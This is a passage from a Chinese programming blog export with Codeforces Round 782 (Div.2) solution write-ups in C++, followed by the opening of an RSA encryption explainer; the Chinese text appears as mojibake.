title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ç»™å®šäºŒè¿›åˆ¶å­—ç¬¦ä¸²å’Œkæ¬¡çš„æ“ä½œï¼Œè¦æ±‚è¾“å‡ºæœ€å¤§å­—å…¸åºçš„å­—ç¬¦ä¸²ã€‚ä¸€æ¬¡æ“ä½œä¼šä½¿ä»»æ„ä¸€ä¸ªä½ç½®çš„å­—ç¬¦ä¸å˜ï¼Œå…¶å®ƒçš„å…¨éƒ¨å–åã€‚é‚£ä¹ˆå®¹æ˜“å¾—åˆ°ä¸€ä¸ªç»“è®ºï¼šå¯¹ä»»æ„ä¸€ä¸ªä½ç½®æ“ä½œå¶æ•°æ¬¡ä¸ä¼šè¯¥è¾¹æ•´ä½“å­—ç¬¦ä¸²ã€‚</p><p>å¦‚æœkä¸ºå¶æ•°ï¼Œåˆ™æœªæ“ä½œè¿‡çš„æ•°ï¼ˆæˆ–è€…è¯´æ“ä½œæ¬¡æ•°ä¸ºå¶æ•°ï¼‰çš„æ•°å°†ä¸å˜ï¼Œæ“ä½œè¿‡çš„æ•°ï¼ˆæˆ–è€…è¯´æ“ä½œæ¬¡æ•°ä¸ºå¥‡æ•°ï¼‰çš„æ•°å°†å–åã€‚</p><p>å¦‚æœkä¸ºå¥‡æ•°ï¼Œåˆ™ä¸å¶æ•°æƒ…å†µåˆšå¥½ç›¸åã€‚</p><p>æˆ‘ä»¬è€ƒè™‘å¶æ•°æƒ…å†µï¼Œå­—ç¬¦ä¸²é«˜ä½å¼€å§‹ï¼Œè‹¥ç¢°åˆ°0åˆ™å–åå˜æˆ1ï¼Œå‡å°‘ä¸€æ¬¡æ“ä½œæ¬¡æ•°å¹¶è®°å½•åœ¨è¿™ä¸ªä½ç½®ã€‚è‹¥æ“ä½œåˆ°æ‰€æœ‰åºåˆ—ä¸ºå…¨1ï¼Œåˆ™å°†å‰©ä½™çš„æ“ä½œå…¨éƒ¨ç”©ç»™æœ€åä¸€ä½ï¼Œä½¿å¾—æœ€åçš„ç»“æœåªå­˜åœ¨ $111â€¦1$ å’Œ $111â€¦0$ã€‚å¦‚æœä¸ºå¥‡æ•°çš„è¯ï¼ŒæŠŠ0å½“æˆ1ï¼Œ1å½“æˆ0å³å¯ï¼Œæˆ‘ä»¬æœ€åè¾“å‡ºçš„æ—¶å€™æŠŠ0è¾“å‡ºä¸º1ï¼Œ1è¾“å‡ºä¸º0ï¼Œæ“ä½œæŒ‰å¶æ•°æ–¹æ³•æ“ä½œå¹¶ä¸”å°½é‡ä½¿å¾—å­—ç¬¦ä¸²ç»“æœä¸º0ã€‚</p><h3 id="æ ‡ç¨‹-1"><a href="#æ ‡ç¨‹-1" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">1000005</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1000005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,k;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">int</span> p=k%<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;1&#x27;</span>&amp;&amp;k)&#123;</span><br><span class="line">                s[i]=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                a[i]=<span class="number">1</span>;</span><br><span class="line">                k--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                a[i]=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;0&#x27;</span>&amp;&amp;k)&#123;</span><br><span class="line">                s[i]=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">                a[i]=<span class="number">1</span>;</span><br><span class="line">                k--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                a[i]=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    a[n<span class="number">-1</span>]+=k;</span><br><span class="line">    <span class="keyword">if</span>(k%<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p)&#123;</span><br><span class="line">            s[n<span class="number">-1</span>]=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            s[n<span class="number">-1</span>]=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p^(s[i]==<span class="string">&#x27;1&#x27;</span>))<span class="built_in">putchar</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">putchar</span>(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    &#125;<span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Line-Empire"><a href="#C-Line-Empire" class="headerlink" title="C. Line Empire"></a>C. Line Empire</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/04/18/Codeforces%20Round%20782(Div.2)/3.png" alt="3"></p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ç»™å®šå é¢†çš„å›½å®¶çš„ä½ç½®å’Œå é¢†èŠ±è´¹ç³»æ•°ä»¥åŠè¿éƒ½èŠ±è´¹ç³»æ•°ï¼Œæ±‚æœ€å°‘èŠ±è´¹å é¢†æ‰€æœ‰ç‹å›½ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ç®—è¿éƒ½äº§ç”Ÿçš„èŠ±è´¹å’Œäº§ç”Ÿçš„æ”¶ç›Šè¿›è¡Œæ¯”è¾ƒï¼Œå½“æ”¶ç›Š&gt;=èŠ±è´¹æ—¶æˆ‘ä»¬é€‰æ‹©è¿éƒ½ï¼Œå¦åˆ™é€‰æ‹©ç›´æ¥æ”»æ‰“é‚£äº›å›½å®¶ã€‚</p><p>ä¸éš¾å¾—åˆ°è¿éƒ½äº§ç”Ÿçš„èŠ±è´¹ä¸º $b|x_i-pos|$ï¼Œposä¸ºå½“å‰é¦–éƒ½çš„ä½ç½®ï¼Œå¾—åˆ°çš„æ”¶ç›Šä¸ºï¼š$a|x_i-pos|*(n-i)$ï¼Œåˆ¤æ–­ä¸€ä¸‹æ¨¡æ‹Ÿå°±ç›´æ¥è¿‡ã€‚</p><h3 id="æ ‡ç¨‹-2"><a href="#æ ‡ç¨‹-2" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> x[<span class="number">1000005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,a,b;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld %lld %lld&quot;</span>,&amp;n,&amp;b,&amp;a);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    x[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> pos=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="comment">//attack</span></span><br><span class="line">        ans+=a*(x[i]-pos);</span><br><span class="line"><span class="comment">//        printf(&quot;attack %d %d %d\n&quot;,i,x[i],a);</span></span><br><span class="line"><span class="comment">//        printf(&quot;ans=%d\n&quot;,ans);</span></span><br><span class="line">        <span class="keyword">int</span> cost=(n-i)*a*(x[i]-pos);</span><br><span class="line">        <span class="keyword">if</span>(cost&gt;=b*(x[i]-pos))&#123;</span><br><span class="line">            ans+=b*(x[i]-pos);</span><br><span class="line">            pos=x[i];</span><br><span class="line"><span class="comment">//            printf(&quot;move in pos %d\n&quot;,i);</span></span><br><span class="line"><span class="comment">//            printf(&quot;ans=%d\n&quot;,ans);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Reverse-Sort-Sum"><a href="#D-Reverse-Sort-Sum" class="headerlink" title="D. Reverse Sort Sum"></a>D. Reverse Sort Sum</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/04/18/Codeforces%20Round%20782(Div.2)/4.png" alt="4"></p><h3 id="é¢˜ç›®åˆ†æ-3"><a href="#é¢˜ç›®åˆ†æ-3" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ç»™ä½ æè¿°äº†ä¸€ä¸ªåºåˆ— A çš„å€¼ä¸º $\sum _{i=1}^{n}f(i,A)$ï¼Œ$f(i,A)$ å‡½æ•°å¾—åˆ°çš„åºåˆ—å°±æ˜¯å°†åºåˆ— A çš„å‰ i ä¸ªæ•°æ’åºï¼Œæ•°çš„å–å€¼åªæœ‰0,1ã€‚ç°åœ¨ç»™å®šæœ€ç»ˆçš„ç»“æœï¼Œè®©ä½ é€†å‘åˆ†æåˆå§‹å¯èƒ½çš„0,1åºåˆ—ã€‚</p><p>è¿™ä¸ªæˆ‘å†™äº†ä¸ªå‡ç®—æ³•ï¼Œæˆ‘è‡ªå·±ä¹Ÿæ— æ³•è¯æ˜è¿™ä¸ªç®—æ³•çš„æ­£ç¡®æ€§ï¼Œä½†æ˜¯ä»–å°±æ˜¯è¿‡äº†ã€‚ã€‚</p><p>é¦–å…ˆåˆ†æåºåˆ—ååŠéƒ¨åˆ†ï¼Œå®¹æ˜“å¾—åˆ°ï¼Œè‹¥$a_i&lt;i$ï¼Œé‚£ä¹ˆ $x_i=0$ï¼Œå¦åˆ™$x_i=1$ï¼Œå› ä¸ºååŠéƒ¨åˆ†è‡³å°‘æœ‰ä¸€åŠçš„å€¼æ˜¯æ¥è‡ªè‡ªå·±è´¡çŒ®çš„ã€‚æ‹¿æœ€åä¸€ä¸ªä¸¾ä¾‹ï¼Œå¦‚æœæœ€åä¸€ä¸ªå€¼ä¸º1æˆ–0ï¼Œé‚£ä¹ˆåŸåºåˆ—æœ€åä¸€ä¸ªå€¼å¿…æ˜¯0ã€‚å¦åˆ™æ˜¯æœ€åä¸€ä¸ªå€¼ä¸€å®šæ˜¯ nï¼Œæ²¡æœ‰å…¶å®ƒæƒ…å†µï¼Œå¯ä»¥å¾ˆå®¹æ˜“å¾—åˆ°çš„ã€‚</p><p>å¯¹äºå‰åŠéƒ¨åˆ†çš„åºåˆ—çš„å€¼ç¡®å®šäº†ç¬¬$i$ä¸ª0çš„ä½ç½®ï¼Œå½“ç„¶ååŠéƒ¨åˆ†æˆ‘ä»¬éƒ½ç¡®å®šå¥½äº†ï¼Œå¦‚æœè¶…å‡ºåˆ™ç›´æ¥ç»“æŸå¾ªç¯è¾“å‡ºç»“æœã€‚</p><h3 id="æ ‡ç¨‹-3"><a href="#æ ‡ç¨‹-3" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> x[<span class="number">1000005</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1000005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x[i]);</span><br><span class="line">        a[i]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i&gt;n/<span class="number">2</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(x[i]&lt;i)&#123;</span><br><span class="line">            a[i]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            a[i]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n/<span class="number">2</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!x[i])&#123;</span><br><span class="line">            a[i]=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a[i]==<span class="number">0</span>)x[i]+=i<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(x[i]==n)<span class="keyword">break</span>;</span><br><span class="line">        a[x[i]+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Dé¢˜å¯èƒ½æœ‰ç‚¹é—®é¢˜ï¼Œæ¬¢è¿å¤§å®¶hackã€‚</p><p>æ€»ä¹‹ç¬¬ä¸€æ¬¡Div2èƒ½åšå‡ºå››é¢˜ï¼Œè¿˜æ˜¯å¾ˆå¼€å¿ƒçš„ã€‚</p><p>æäº¤è®°å½•ï¼š</p><p><img src="/2022/04/18/Codeforces%20Round%20782(Div.2)/5.png" alt="5"></p><p><img src="/2022/04/18/Codeforces%20Round%20782(Div.2)/6.png" alt="6"></p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> æ€ç»´ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RSAåŠ å¯†åŸç†è§£æ</title>
      <link href="/2022/04/15/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/"/>
      <url>/2022/04/15/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©æ¥æ·±åº¦è§£æä¸€ä¸‹<code>RSA</code>åŠ å¯†</p><span id="more"></span><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p>è¿˜æ˜¯æœ€æœ´ç´ çš„ä¾‹å­ï¼Œ<code>Alice</code>å’Œ<code>Bob</code>è¦åœ¨ä¸å®‰å…¨çš„è·¯çº¿ä¸Šå‘é€ä¿¡æ¯ï¼Œæ•´æ¡çº¿è·¯å®Œå…¨è¢«çªƒå¬è€…<code>Eve</code>æ‰€çŸ¥ï¼Œå¦‚ä½•è®©<code>Alice</code>å’Œ<code>Bob</code>å®‰å…¨åœ°é€šä¿¡å‘¢ï¼Ÿå¦‚æœè¿™ä¸ªä¾‹å­ç•¥éš¾æ‡‚ï¼Œé‚£æ¢ä¸€ä¸ªæ¥è®²ï¼Œæˆ‘è¦ç»™åˆ«äººå¯„ä¸ªå¿«é€’ï¼Œæˆ‘æ€æ ·è®©åˆ«äººä¸çŸ¥é“æˆ‘å¯„çš„æ˜¯ä»€ä¹ˆï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¦‚æœæ²¡ä»€ä¹ˆç‰¹æ®Šæƒ…å†µï¼Œå¿«é€’æ˜¯ä¸ä¼šè¢«éšä¾¿æ‹†å¼€æŸ¥çœ‹çš„ï¼Œä½†æ˜¯ä¹Ÿå¾ˆéš¾è¯´ï¼Œå¦‚æœæˆ‘ç»™æˆ‘å®é™…è¦é€çš„ä¸œè¥¿ä¸ŠæŠŠé”ï¼Œé‚£ä¹ˆå³ä½¿æˆ‘é€çš„å¿«é€’è¢«æ‹†å¼€ï¼Œæ²¡æœ‰é’¥åŒ™ä¹Ÿä¸ä¼šæœ‰äººçŸ¥é“æˆ‘é€çš„æ˜¯å•¥ï¼Œè€Œé’¥åŒ™åªæœ‰æ”¶ä»¶äººæ‹¥æœ‰ã€‚</p><p>è¿™å°±æ˜¯éå¯¹ç§°åŠ å¯†çš„ä¸€ä¸ªä¾‹å­äº†ï¼Œä¸€ä¸ªäººåªæœ‰é”ï¼Œå¦ä¸€ä¸ªäººæœ‰é’¥åŒ™ï¼Œå¯ä»¥è¿™ä¹ˆè¯´ï¼Œå½“æŠŠé”å…³ä¸Šçš„é‚£ä¸€åˆ»ï¼Œå¯„ä»¶äººéƒ½æ²¡åŠæ³•æ‰“å¼€å»æ£€æŸ¥ä»–å¯„çš„æ˜¯å•¥ï¼Œå¦‚æœè¿™ä¸ªé”è¶³å¤Ÿå¼ºå¤§çš„è¯ã€‚</p><h2 id="RSAåŠ å¯†"><a href="#RSAåŠ å¯†" class="headerlink" title="RSAåŠ å¯†"></a>RSAåŠ å¯†</h2><p>rsaä¸»è¦æ˜¯åˆ©ç”¨ä¸€ç³»åˆ—çš„æ•°å­¦å…¬å¼ï¼Œè®©æ¨å¯¼éš¾ä»¥é€†å‘åˆ†æï¼Œå¸¸è§çš„æœ‰å³ç§»è¿ç®—æˆ–è€…å–æ¨¡è¿ç®—ï¼ŒRSAä¸»è¦æ˜¯ä½¿ç”¨å–æ¨¡è¿ç®—ã€‚é¦–å…ˆï¼Œæˆ‘é€‰æ‹©ä¸€ä¸ªæŒ‡æ•°(e)ï¼Œè®©æ˜æ–‡(m)è¿›è¡Œè¿™ä¹ˆå¤šæ¬¡çš„å¹‚è¿ç®—ï¼Œå†æ¨¡ä¸Šä¸€ä¸ªæ•°(N)ï¼Œè¿™ä¹Ÿå°±å¾—åˆ°äº†å¯†æ–‡(c)ï¼Œè¿™ä¸ªå¯†æ–‡éš¾ä»¥é€†å‘å¾—åˆ°æ˜æ–‡ï¼Œå› ä¸ºå–æ¨¡è¿ç®—ä¸å¯é€†ï¼Œè¿™ä¸ªeå’ŒNæ˜¯å…¬å¼€çš„ï¼Œæ‰€æœ‰äººéƒ½å¯ä»¥åŠ å¯†ï¼Œä¹Ÿå°±æ˜¯é”ï¼Œä½†æ˜¯é’¥åŒ™åªæœ‰è‡ªå·±æ‹¥æœ‰ã€‚</p><p><img src="/2022/04/15/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/1.png" alt="1"></p><p>è¿™é‡Œä¹Ÿå…ˆç»™å‡ºåŠ å¯†å’Œè§£å¯†çš„å…¬å¼ï¼š</p><p><img src="/2022/04/15/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/2.png" alt="2"></p><p>åœ¨è¿™é‡Œdç”±ä¸€ä¸ªå…¬å¼ç®—å¾—ï¼šdç›¸å½“äºeåœ¨æ¨¡Ï†(n)æ„ä¹‰ä¸‹çš„é€†å…ƒã€‚ä¹Ÿå°±æ˜¯å®ƒä»¬æ»¡è¶³è¿™ä¸ªå…¬å¼ï¼š</p><p>$e\times d \ \ \text{mod}\ \ Ï†(n)=1$</p><h2 id="RSAåŠ å¯†åŸç†è§£æ"><a href="#RSAåŠ å¯†åŸç†è§£æ" class="headerlink" title="RSAåŠ å¯†åŸç†è§£æ"></a>RSAåŠ å¯†åŸç†è§£æ</h2><p>ä¸ºä»€ä¹ˆæ»¡è¶³äº†è¿™ä¸ªå…³ç³»å°±èƒ½é€šè¿‡ä¸Šé¢çš„å…¬å¼è§£å¯†äº†å‘¢ï¼Ÿ</p><p>é€šè¿‡eå’Œdæ»¡è¶³çš„å…³ç³»æˆ‘ä»¬å¯ä»¥å¾—åˆ°è¿™æ ·çš„å¼å­ï¼š</p><p>$e \times d=1+k*Ï†(n)$</p><p>kä¸ºä»»æ„æ•´æ•°ã€‚</p><p>$d=\frac{1+k*Ï†(n)}{e}$</p><p>è¿™é‡Œè¿˜éœ€è¦ä¸€ä¸ªå®šç†ï¼šæ¬§æ‹‰å®šç†</p><h3 id="æ¬§æ‹‰å®šç†"><a href="#æ¬§æ‹‰å®šç†" class="headerlink" title="æ¬§æ‹‰å®šç†"></a>æ¬§æ‹‰å®šç†</h3><p>è¿™ä¸ªç®—è´¹é©¬å°å®šç†çš„æ‰©å±•å§ï¼Œè´¹é©¬å°å®šç†çš„è¡¨è¾¾å¼å¦‚ä¸‹ï¼š</p><p>å¯¹äºä»»æ„æ•´æ•°aå’Œä»»æ„è´¨æ•°pæœ‰ä»¥ä¸‹å¼å­æˆç«‹ï¼š</p><p>$a^p$ä¸$a$åœ¨$\ \text{mod}\ p$ æ„ä¹‰ä¸‹åŒä½™ï¼Œå³$a^{p-1}\ \text{mod}\ p=1$</p><p>è€Œå¯¹äºä»»æ„è´¨æ•°ï¼Œå®ƒçš„æ¬§æ‹‰å‡½æ•°å°±æ˜¯è‡ªå·±-1ï¼Œæ¬§æ‹‰å‡½æ•°çš„æè¿°ä¸º</p><blockquote><p>æ¬§æ‹‰å‡½æ•° æ˜¯å°äºæˆ–ç­‰äºnçš„æ­£æ•´æ•°ä¸­ä¸näº’è´¨çš„æ•°çš„æ•°ç›®</p></blockquote><p>è€Œå¯¹äºéè´¨æ•°ï¼Œå®ƒä¸€å®šå¯ä»¥å†™æˆè‹¥å¹²ä¸ªè´¨æ•°ç›¸ä¹˜ï¼Œå³</p><p>$n=p_1^{a_1}\times p_2^{a_2}\times p_3^{a_3}\timesâ€¦â€¦\times 